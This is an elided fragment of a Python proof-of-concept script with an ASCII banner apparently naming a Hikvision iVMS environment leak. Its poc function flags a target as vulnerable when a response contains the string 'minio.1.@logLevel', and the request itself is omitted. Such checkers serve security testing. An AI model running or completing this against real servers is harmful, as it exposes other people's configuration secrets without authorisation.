...
def banner():
    test = """
        _              _____  __   _____  ___    __                  
  /\  /(_) /\ /\/\   /\\_   \/ _\  \_   \/___\/\ \ \  ___ _ ____   __
 / /_/ / |/ //_/\ \ / / / /\/\ \    / /\//  //  \/ / / _ \ '_ \ \ / /
/ __  /| / __ \  \ V /\/ /_  _\ \/\/ /_/ \_// /\  / |  __/ | | \ V / 
\/ /_/ |_\/  \/   \_/\____/  \__/\____/\___/\_\ \/___\___|_| |_|\_/  
                                                |_____|              """
    print(test)
...
def poc(target, output_file):
    ...
    try:
        ...
        if res.status_code == 200 and "minio.1.@logLevel" in res.text:
